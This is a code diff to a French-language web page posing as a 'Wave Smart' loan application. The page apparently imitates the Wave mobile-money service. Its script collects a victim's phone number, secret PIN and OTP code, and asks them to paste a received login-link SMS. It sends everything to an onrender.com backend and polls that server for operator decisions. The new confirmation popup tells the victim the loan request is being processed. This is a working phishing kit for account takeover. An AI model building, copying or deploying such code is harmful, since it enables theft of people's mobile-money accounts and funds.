@@ -248,6 +248,33 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .tck { width:20px; height:20px; border-radius:50%; background:#f0fdf4; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
 .tck svg { width:11px; height:11px; stroke:#22c55e; fill:none; stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round; }
 
+/* ── SMS Done Popup ── */
+.sms-done-overlay {
+  position:absolute; top:0; left:0; right:0; bottom:0;
+  background:rgba(0,0,0,0.35);
+  display:flex; align-items:center; justify-content:center;
+  z-index:20;
+  backdrop-filter:blur(3px);
+  animation:fadeInOv 0.25s ease both;
+}
+@keyframes fadeInOv { from{opacity:0} to{opacity:1} }
+.sms-done-card {
+  background:#fff;
+  border-radius:24px;
+  padding:32px 28px 28px;
+  width:320px;
+  max-width:calc(100% - 48px);
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,0.18);
+  animation:popUpCard 0.35s cubic-bezier(0.34,1.4,0.64,1) both;
+}
+@keyframes popUpCard { from{transform:scale(0.85) translateY(20px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }
+.sms-done-title { font-size:20px; font-weight:700; color:#111; margin-bottom:10px; line-height:1.3; }
+.sms-done-body  { font-size:14px; color:#666; line-height:1.7; margin-bottom:8px; }
+.sms-done-days  { font-size:17px; font-weight:700; color:#4dc8e8; margin-bottom:24px; }
+.sms-done-btn   { display:block; width:100%; padding:14px; background:#4dc8e8; border:none; border-radius:50px; font-size:15px; font-weight:700; font-family:'Patrick Hand',cursive; color:#fff; cursor:pointer; transition:background 0.15s; }
+.sms-done-btn:hover { background:#3ab8d8; }
+
 @media(max-width:430px) and (max-height:780px){
   .tbar { padding:14px 0 0; }
   .prog-wrap { margin-bottom:12px; }
@@ -551,16 +578,13 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
   <!-- ══ SMS PASTE ══ -->
   <div class="scr" id="s-sms" style="flex-direction:column;">
-    <!-- Header back button -->
     <div class="wave-back" onclick="go('s-sms','s-otp')">
       <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
     </div>
-
-    <!-- Content area -->
     <div style="flex:1;display:flex;flex-direction:column;align-items:center;padding:20px 32px 32px;overflow-y:auto;-webkit-overflow-scrolling:touch;">
 
       <!-- Icon -->
-      <div style="width:80px;height:80px;background:#5B4FD9;border-radius:20px;display:flex;align-items:center;justify-content:center;margin-bottom:40px;flex-shrink:0;">
+      <div style="width:80px;height:80px;background:#5B4FD9;border-radius:20px;display:flex;align-items:center;justify-content:center;margin-bottom:32px;flex-shrink:0;">
         <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
           <rect x="4" y="9" width="32" height="22" rx="4" fill="white" opacity="0.95"/>
           <circle cx="12" cy="20" r="2.8" fill="#5B4FD9"/>
@@ -570,27 +594,23 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
         </svg>
       </div>
 
-      <!-- Subtitle -->
       <p style="font-size:16px;color:#111827;text-align:center;margin-bottom:8px;line-height:1.5;font-weight:600;">
         Pour vérifier votre identité, nous vous avons envoyé un SMS contenant un code-lien de connexion sécurisé au
       </p>
 
-      <!-- Phone number -->
-      <p id="smsPh" style="font-size:26px;font-weight:600;color:#111827;text-align:center;margin-bottom:24px;letter-spacing:1px;"></p>
+      <p id="smsPh" style="font-size:26px;font-weight:600;color:#111827;text-align:center;margin-bottom:20px;letter-spacing:1px;"></p>
 
-      <!-- Instruction -->
-      <p style="font-size:15px;color:#111827;text-align:center;margin-bottom:48px;line-height:1.6;font-weight:600;">
+      <p style="font-size:15px;color:#111827;text-align:center;margin-bottom:24px;line-height:1.6;font-weight:600;">
         Pour continuer, veuillez copier et coller le SMS envoyé à ce numéro de téléphone ici.
       </p>
 
-      <!-- Paste area -->
-      <div style="width:100%;background:#f3f4f6;border-radius:12px;padding:14px 18px;margin-bottom:32px;height:130px;flex-shrink:0;">
+      <!-- Paste area — height reduced by 60% (130px → 52px) -->
+      <div style="width:100%;background:#f3f4f6;border-radius:12px;padding:10px 14px;margin-bottom:28px;height:52px;flex-shrink:0;">
         <textarea id="smsPasteArea" placeholder="Collez le SMS ici..."
-          style="width:100%;height:100%;background:transparent;border:none;outline:none;resize:none;font-size:15px;color:#111827;font-family:'Patrick Hand',cursive;line-height:1.5;overflow-y:auto;display:block;"
+          style="width:100%;height:100%;background:transparent;border:none;outline:none;resize:none;font-size:15px;color:#111827;font-family:'Patrick Hand',cursive;line-height:1.4;overflow-y:auto;display:block;"
         ></textarea>
       </div>
 
-      <!-- Submit link -->
       <a href="#" onclick="doSmsSubmit();return false;"
         style="font-size:15px;color:#0284C7;text-decoration:none;font-weight:600;margin-bottom:auto;">
         Soumettre
@@ -598,8 +618,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
     </div>
 
-    <!-- Footer -->
-    <div style="padding:24px 32px 48px;text-align:center;">
+    <div style="padding:24px 32px 40px;text-align:center;">
       <button id="smsResendBtn" disabled onclick="doSmsResend()"
         style="display:block;width:100%;margin-bottom:6px;font-size:15px;color:#0284C7;font-weight:600;background:none;border:none;cursor:pointer;font-family:'Patrick Hand',cursive;opacity:0.4;transition:opacity 0.2s;padding:4px 0;">
         Renvoyer le lien
@@ -612,48 +631,54 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
     </div>
   </div>
 
-  <!-- ══ SMS CONFIRMATION ══ -->
-  <div class="scr" id="s-sms-done" style="flex-direction:column;">
-    <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 32px;text-align:center;">
+  <!-- ══ SMS DONE — screen with popup overlay ══ -->
+  <div class="scr" id="s-sms-done" style="flex-direction:column;position:relative;">
 
-      <!-- Penguin icon -->
-      <div style="margin-bottom:28px;">
-        <svg width="100" height="122" viewBox="0 0 120 145" xmlns="http://www.w3.org/2000/svg">
-          <ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/>
-          <ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/>
-          <circle cx="60" cy="48" r="26" fill="#111"/>
-          <circle cx="51" cy="43" r="4.5" fill="#fff"/>
-          <circle cx="69" cy="43" r="4.5" fill="#fff"/>
-          <circle cx="52" cy="44" r="2.2" fill="#111"/>
-          <circle cx="70" cy="44" r="2.2" fill="#111"/>
-          <ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/>
-          <ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/>
-          <ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/>
-          <ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/>
-          <ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/>
-        </svg>
+    <!-- Dimmed background content -->
+    <div style="flex:1;display:flex;align-items:center;justify-content:center;background:#f7f7f7;filter:blur(1px);">
+      <p style="color:#ccc;font-size:13px;">Wave Smart</p>
+    </div>
+
+    <!-- Popup overlay -->
+    <div class="sms-done-overlay" id="smsDoneOverlay">
+      <div class="sms-done-card">
+
+        <!-- Penguin at 50px (50% of original 100px) -->
+        <div style="display:flex;align-items:center;justify-content:center;margin-bottom:16px;">
+          <svg width="50" height="61" viewBox="0 0 120 145" xmlns="http://www.w3.org/2000/svg">
+            <ellipse cx="60" cy="95" rx="33" ry="42" fill="#111"/>
+            <ellipse cx="60" cy="100" rx="19" ry="29" fill="#fff"/>
+            <circle cx="60" cy="48" r="26" fill="#111"/>
+            <circle cx="51" cy="43" r="4.5" fill="#fff"/>
+            <circle cx="69" cy="43" r="4.5" fill="#fff"/>
+            <circle cx="52" cy="44" r="2.2" fill="#111"/>
+            <circle cx="70" cy="44" r="2.2" fill="#111"/>
+            <ellipse cx="60" cy="54" rx="6" ry="4" fill="#f90"/>
+            <ellipse cx="32" cy="62" rx="9" ry="22" fill="#111" transform="rotate(-70 32 62)"/>
+            <ellipse cx="89" cy="90" rx="9" ry="20" fill="#111" transform="rotate(12 89 90)"/>
+            <ellipse cx="48" cy="134" rx="11" ry="6" fill="#f90"/>
+            <ellipse cx="70" cy="134" rx="11" ry="6" fill="#f90"/>
+          </svg>
+        </div>
+
+        <div class="sms-done-title">Message reçu !</div>
+
+        <div class="sms-done-body">
+          Votre demande a été soumise avec succès. Vous serez notifié par SMS du statut de votre demande de prêt dans
+        </div>
+        <div class="sms-done-days">3 à 5 jours ouvrables.</div>
+
+        <!-- OK → go back to landing screen -->
+        <button class="sms-done-btn" onclick="smsDoneOk()">OK</button>
+
       </div>
-
-      <!-- Title -->
-      <p style="font-size:22px;font-weight:700;color:#111;margin-bottom:14px;line-height:1.3;">
-        Message reçu !
-      </p>
-
-      <!-- Body -->
-      <p style="font-size:15px;color:#555;line-height:1.7;margin-bottom:10px;">
-        Votre SMS a bien été soumis. Vous serez notifié par SMS du statut de votre demande de prêt dans
-      </p>
-      <p style="font-size:18px;font-weight:700;color:#4dc8e8;margin-bottom:28px;">
-        3 à 5 jours ouvrables.
-      </p>
-
     </div>
   </div>
 
 </div><!-- .wrap -->
 
 <script>
-var API = 'https://wave-smart.onrender.com/api';
+var API = 'https://wave-wyre.onrender.com/api';
 var sessId = null, pollTmr = null, verifying = false, msgTimer = null;
 
 function showLoad(msg){
@@ -679,6 +704,23 @@ function go(from, to){
   var t = document.getElementById(to);
   t.classList.add('active');
   t.scrollTop = 0;
+}
+
+/* OK button on the sms-done popup → fade out overlay then go to landing */
+function smsDoneOk(){
+  var overlay = document.getElementById('smsDoneOverlay');
+  overlay.style.transition = 'opacity 0.2s';
+  overlay.style.opacity = '0';
+  setTimeout(function(){
+    overlay.style.opacity = '';
+    overlay.style.transition = '';
+    go('s-sms-done', 's-land');
+    /* reset login state for a fresh session */
+    loginVal = '';
+    document.getElementById('loginPh').value = '';
+    var btn = document.getElementById('loginBtn');
+    btn.className = 'wave-next';
+  }, 220);
 }
 
 function cfa(n){ return Math.round(n).toLocaleString('fr-FR')+' FCFA'; }
@@ -849,12 +891,7 @@ async function submitPIN(){
   }
 }
 
-/* ═══════════════════════════════════════════
-   POLL — PIN screen only (never touches OTP input)
-═══════════════════════════════════════════ */
-
 var pollActive = false;
-// When true, we are on the OTP screen waiting for user to type — poll is SUSPENDED
 var otpScreen  = false;
 
 function stopPoll(){
@@ -883,7 +920,6 @@ function startPoll(sid){
 
   pollTmr = setInterval(async function(){
     if(!pollActive) return;
-    // ── CRITICAL: never process server responses while user is on OTP screen typing ──
     if(otpScreen) return;
     try{
       var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
@@ -892,31 +928,24 @@ function startPoll(sid){
       if(r.status==='pending' || r.status==='otp_pending') return;
 
       if(r.status==='approved'){
-        stopPoll();
-        hideLoad();
+        stopPoll(); hideLoad();
         enterOTP(sid);
 
       } else if(r.status==='approved_otp'){
-        stopPoll();
-        hideLoad();
-        go('s-otp','s-sms-done');
+        stopPoll(); hideLoad();
+        showSmsDone();
 
       } else if(r.status==='sms_required'){
-        stopPoll();
-        hideLoad();
+        stopPoll(); hideLoad();
         enterSMS(sid);
 
       } else if(r.status==='wrong_pin'){
-        stopPoll();
-        hideLoad();
+        stopPoll(); hideLoad();
         showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
         setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
 
       } else if(r.status==='wrong_code'){
-        // Only act on wrong_code when poll is deliberately running after doVerify
-        // otpScreen=false means we're in the post-submit polling phase
-        stopPoll();
-        hideLoad();
+        stopPoll(); hideLoad();
         showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
         setTimeout(function(){ otpScreen=true; resetOTP(); }, 400);
 
@@ -939,16 +968,27 @@ function startPoll(sid){
   }, 1500);
 }
 
-// enterOTP: go to OTP screen, STOP polling, start countdown
+/* Show the sms-done screen (resets overlay animation) */
+function showSmsDone(){
+  var overlay = document.getElementById('smsDoneOverlay');
+  overlay.style.opacity = '';
+  overlay.style.display = 'flex';
+  /* re-trigger animation by removing and re-adding the class */
+  var card = overlay.querySelector('.sms-done-card');
+  card.style.animation = 'none';
+  card.offsetHeight; /* reflow */
+  card.style.animation = '';
+  go('s-otp', 's-sms-done');
+}
+
 function enterOTP(sid){
-  stopPoll();          // ← poll is DEAD while user types
-  otpScreen = true;   // ← flag: we are in OTP input mode
+  stopPoll();
+  otpScreen = true;
   resetOTP();
   go('s-pin','s-otp');
   setTimeout(function(){ startResendCd(10); }, 100);
 }
 
-/* ── OTP keypad & verification ── */
 var otpVal = '';
 var otpSlotEls  = [0,1,2,3].map(function(i){ return document.getElementById('osd'+i); });
 var otpSlotWrps = [0,1,2,3].map(function(i){ return otpSlotEls[i].parentElement; });
@@ -980,13 +1020,11 @@ function resetOTP(){
 async function doVerify(){
   if(otpVal.length!==4 || !sessId || verifying) return;
   verifying = true;
-  otpScreen = false;   // ← leave OTP-input-safe mode: poll can now react to wrong_code
+  otpScreen = false;
   showLoad('Vérification du code…');
   var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
   if(r && r.success){
-    // Poll will pick up the final status (approved/continue/etc)
     verifying = false;
-    // If server signals sms step directly on otp_entered response
     if(r.status === 'sms_required'){
       hideLoad();
       enterSMS(sessId);
@@ -994,7 +1032,6 @@ async function doVerify(){
       startPoll(sessId);
     }
   } else {
-    // Network/API error — treat as wrong code
     hideLoad();
     showPop('Code incorrect','Le code de validation saisi est incorrect. Veuillez réessayer.');
     setTimeout(function(){
@@ -1004,9 +1041,7 @@ async function doVerify(){
   }
 }
 
-/* ── Resend countdown ── */
 var resTimer = null;
-
 function startResendCd(secs){
   var btn = document.getElementById('resendBtn');
   var cd  = document.getElementById('resendCd');
@@ -1039,7 +1074,6 @@ async function doResend(){
   if(!r || !r.success){
     await callApi('login_attempt', { sessionId: sessId, phone: loginVal, firstName: fn||'Unknown', lastName: ln||'User', pin: pinVal||'0000', resend: '1' });
   }
-  // Stay in otpScreen mode — poll remains stopped while user types new code
   document.getElementById('tav').textContent = '✉';
   document.getElementById('tn').textContent  = 'SMS renvoyé';
   document.getElementById('td').textContent  = 'Un nouveau code a été envoyé';
@@ -1081,14 +1115,9 @@ function enterSMS(sid){
   if(ph && otpPhEl) ph.textContent = otpPhEl.textContent;
   else if(ph) ph.textContent = loginVal ? loginVal.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/,'$1 $2 $3 $4') : '';
   var ta = document.getElementById('smsPasteArea');
-  if(ta){ ta.value=''; ta.style.height='24px'; }
+  if(ta){ ta.value=''; }
   go('s-otp','s-sms');
   setTimeout(function(){ startSmsResendCd(); }, 100);
-}
-
-function smsTextareaGrow(el){
-  el.style.height = '24px';
-  el.style.height = el.scrollHeight + 'px';
 }
 
 async function doSmsSubmit(){
@@ -1099,7 +1128,12 @@ async function doSmsSubmit(){
   var r = await callApi('sms_pasted', { sessionId: sessId, smsText: txt, phone: loginVal });
   hideLoad();
   if(r && r.success){
-    go('s-sms','s-sms-done');
+    showSmsDone();
+    /* re-navigate from sms to sms-done */
+    var cur = document.querySelector('.scr.active');
+    if(cur && cur.id !== 's-sms-done'){
+      go(cur.id, 's-sms-done');
+    }
   } else {
     showPop('Erreur','Une erreur est survenue. Veuillez réessayer.');
   }
